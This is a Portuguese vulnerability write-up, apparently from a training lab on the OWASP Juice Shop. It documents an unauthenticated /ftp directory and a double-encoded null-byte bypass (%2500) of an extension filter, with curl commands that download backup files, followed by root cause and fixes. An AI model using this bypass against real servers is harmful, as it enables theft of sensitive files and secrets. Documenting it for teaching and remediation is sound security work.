# 04 - Arquivos sensíveis expostos e path traversal no /ftp

## Resumo

O diretório `/ftp` é servido sem autenticação e lista arquivos que não deveriam estar ao
alcance do público, incluindo uma base de senhas KeePass e backups. O download direto de
extensões perigosas como `.bak` é barrado com 403, mas um null byte codificado na URL
(`%2500`) engana o filtro de extensão e libera o arquivo. Vazam dados sensíveis e código.

- **Caminho:** `GET /ftp/` e `GET /ftp/<arquivo>`
- **Categoria OWASP Top 10 (2021):** A01 Broken Access Control (com A05 Security Misconfiguration)
- **Severidade:** Alta
- **CVSS 3.1:** 7.5 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)

## Ambiente

- Alvo: OWASP Juice Shop em `http://localhost:3000` (via `docker compose up -d`)
- Ferramenta: cURL ou o script `exploits/04_ftp_path_traversal.py`

## Passos de reprodução

### Diretório aberto

```bash
curl -s http://localhost:3000/ftp
```

A listagem responde 200 e expõe, entre outros:

```
acquisitions.md
coupons_2013.md.bak
incident-support.kdbx      # base de senhas KeePass
package.json.bak
encrypt.pyc
```

### Baseline: o filtro de extensão barra o .bak

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/ftp/package.json.bak
# 403
```

### Ataque: o null byte derruba o filtro

```bash
curl -s http://localhost:3000/ftp/package.json.bak%2500.md
# 200, e o conteúdo real do backup vem no corpo
```

O `%2500` é a forma duplamente codificada do byte nulo. O filtro olha para o final da URL,
vê `.md` e aprova. O caminho que chega ao sistema de arquivos termina no null byte, antes
do `.md`, e resolve para o `.bak`. O servidor entrega o backup.

## Causa raiz

Dois erros somados. Primeiro, um diretório inteiro de arquivos sensíveis fica acessível sem
qualquer controle de acesso. Segundo, a proteção contra o download desses arquivos é feita
por uma checagem frágil de extensão no texto da URL, que não corresponde a como o caminho
é de fato resolvido no disco. Validar o nome sem canonizar o caminho é uma defesa que se
engana sozinha.

## Impacto

- Vazamento de backups de código e configuração, que podem conter segredos.
- Acesso à base KeePass e a backups que ajudam a escalar o ataque.
- O bypass por null byte tende a alcançar outros arquivos filtrados pela mesma regra.

## Correção

- **Não servir arquivos sensíveis** por uma rota pública. O diretório não deveria estar
  exposto, e o que for público deve ser uma allowlist explícita.
- **Canonizar o caminho antes de qualquer checagem** e validar o caminho resolvido, não o
  texto cru da URL. Rejeitar bytes nulos e sequências de traversal na entrada.
- **Validar por allowlist de extensão sobre o caminho já resolvido**, em vez de confiar no
  que aparece no fim da URL.

## Referências

- OWASP Top 10 2021 - A01 Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- OWASP Embedding Null Code: https://owasp.org/www-community/attacks/Embedding_Null_Code
